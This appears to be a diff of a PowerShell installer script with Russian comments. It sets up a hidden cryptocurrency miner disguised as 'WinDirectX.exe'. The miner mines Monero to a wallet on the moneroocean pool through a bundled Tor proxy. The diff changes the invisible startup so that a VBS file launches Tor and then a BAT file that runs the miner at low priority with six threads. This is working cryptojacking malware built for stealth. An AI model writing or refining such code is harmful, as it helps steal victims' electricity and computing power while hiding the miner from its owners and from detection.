@@ -89,19 +89,18 @@ if (!(Test-Path "$path\tor.exe")) {
 }
 
 
-# 6. СОЗДАНИЕ ТИХОГО ЗАПУСКА (TOR + МАЙНЕР)
-# Создаем BAT-файл, который последовательно запускает сеть и майнинг
-$cmd = "@echo off`n" +
-       "start /b $path\tor.exe --SocksPort 9050 --Quiet`n" +
-       "timeout /t 20 /nobreak >nul`n" +
-       "start /b /low $path\WinDirectX.exe -o gulf.moneroocean.stream:443 -u $wallet -p $env:COMPUTERNAME --algo rx/0 --tls --proxy=socks5://127.0.0.1:9050 --threads=6"
 
+# 6. СОЗДАНИЕ ТИХОГО ЗАПУСКА (ДВОЙНОЙ ЗАПУСК ИЗ VBS)
+# 6a. Создаем BAT-файл (только для майнера)
+$cmd = "@echo off`n" +
+       "timeout /t 15 /nobreak >nul`n" +
+       "start /b /low $path\WinDirectX.exe -o gulf.moneroocean.stream:443 -u $wallet -p $env:COMPUTERNAME --algo rx/0 --tls --proxy=socks5://127.0.0.1:9050 --threads=6"
 $cmd | Out-File -FilePath "$path\run_cache.bat" -Encoding ascii
 
-# Создаем VBS, который запускает этот BAT-файл абсолютно невидимо
+# 6b. Создаем VBS, который запускает сначала TOR, а потом БАТНИК
 $vbs = "Set WshShell = CreateObject(`"WScript.Shell`")`n" +
+       "WshShell.Run `"$path\tor.exe --SocksPort 9050 --Quiet`", 0, False`n" +
        "WshShell.Run `"$path\run_cache.bat`", 0, False"
-
 $vbs | Out-File -FilePath "$path\win_start.vbs" -Encoding ascii
 
 
